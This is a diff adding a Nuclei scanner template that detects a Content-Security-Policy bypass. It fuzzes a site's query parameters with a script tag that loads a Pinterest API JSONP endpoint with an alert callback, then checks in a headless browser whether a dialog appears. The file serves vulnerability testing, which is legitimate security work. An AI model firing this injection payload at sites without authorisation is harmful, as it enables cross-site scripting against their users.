@@ -1,0 +1,55 @@
+id: pinterest-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Pinterest API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,pinterest-api,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "pinterest.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: pinterest_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "pinterest_api_csp_xss == true"
+# digest: 490a0046304402201cf99a871a6b19960995c632d825e922c9b4903f063070e56bc4f23c8c05d91c02200ad9b2e236efc97f90aa882f6b2191e548f5b99c839295d0aba1e59c87e97028:922c64590222798bb761d5b6d8e72950
